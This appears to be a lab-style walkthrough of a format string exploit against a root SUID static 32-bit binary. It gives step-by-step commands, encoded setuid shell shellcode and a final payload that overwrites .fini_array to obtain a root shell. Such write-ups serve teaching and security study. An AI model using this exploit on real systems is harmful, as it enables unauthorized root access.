# Linux Format String Attacks

## Exploiting 32-bit SUID Static Executable With No ASLR
In this example, the root SUID executable to be exploited had no dynamic linking. The executable prints the input provided using the C printf function.

The first step is to determine if the executable is exploitable with a format string attack.

```bash
./echo $(python -c 'print "%x." * 8')
```

The above command will print eight hexadecimal values from the top of the stack if it's vulnerable to a format string attack, in this case it was vulnerable.

The next step is to determine if ASLR is enabled and if the stack is executable.

```bash
# Check if Address Space Layout Randomization (ASLR) is enabled; value of 1 or 2 means it's enabled
cat /proc/sys/kernel/randomize_va_space

# Check if the stack is executable; output will be returned if it's executable
readelf -W -l ./echo | grep 'GNU_STACK' | grep 'RWE'
```

The output returned for ASLR was 0, which means ASLR is disabled. No output was returned from readelf meaning the stack is not executable.

To get around a non-executable stack, an environment variable can be created to store the shellcode that will be executed to gain shell access.

```bash
# NOP sled is 1003 to align bits for offsets later on
# setuid plus /bin/sh
export SHELLCODE=$(python -c 'print "\x90" * 1003 + "\x89\xe7\xda\xc3\xd9\x77\xf4\x5f\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x75\x61\x4b\x6b\x51\x7a\x42\x37\x56\x38\x68\x4d\x6d\x50\x43\x5a\x64\x4b\x33\x68\x6a\x39\x36\x32\x35\x36\x51\x78\x44\x6d\x61\x73\x6e\x69\x79\x77\x33\x58\x34\x6f\x31\x63\x32\x48\x73\x30\x43\x58\x54\x6f\x53\x52\x51\x79\x62\x4e\x6f\x79\x7a\x43\x43\x62\x38\x68\x77\x78\x63\x30\x43\x30\x55\x50\x36\x4f\x50\x62\x51\x79\x52\x4e\x66\x4f\x42\x53\x30\x68\x55\x50\x46\x37\x53\x63\x6d\x59\x49\x71\x7a\x6d\x4f\x70\x41\x41"')
```

To get the memory address of the shellcode environment variable, a C program was created.

```c
#include <stdlib.h>

int main(int argc, char *argv[]) {
    char *addr;
    addr = getenv(argv[1]);
    printf("%s is located at %p\n", argv[1], addr);
}
```

Getting the shellcode environment variable address.

```bash
/home/jack/envs SHELLCODE
```

The address returned was 0xbffffa1f. The program name had to be the same filename length as the vulnerable executable as the program names are stored on the stack at startup.

The next step was to determine where to write this address. As the executable was static, the choice was to use the .fini_array. The runtime linker will execute functions whose addresses are in the array.

```bash
objdump -h ./echo
```

Viewing the output showed that the .fini_array was writable and was 8 bytes with a memory address of 080c9614.

After getting the memory addresses, the offsets need to be determined.

```bash
for i in `seq 1 256`; do /home/jack/echo AAABCCCB' '$i' %'$i$'$p\n'; done
```

From the output, the offsets shown were 116 and 117.

```text
AAABCCCB 116 0x42414141
AAABCCCB 117 0x42434343
```

As the shellcode memory address converted to decimal was greater than a 32-bit integer, we needed to split the memory address into writable values. The address was split into two 16-bit integers.

The formula to determine the format string attack:

```text
# The hn is a 16-bit write
<dest_addr> + <dest_addr + 2> + %<LOB - 8>c%f_ofst$hn + %<HOB - LOB + 0x10000>c%s_ofst$hn

# 0xbffffa1f
LOB = 0xfa1f
HOB = 0xbfff

dest_addr = 0x80c9614
f_ofst = 116
s_ofst = 117
```

The following command was used to gain root shell.

```bash
/home/jack/echo $(python -c 'print "\x14\x96\x0c\x08" + "\x16\x96\x0c\x08" + "%64023c%116$hn%50656c%117$hn"')
```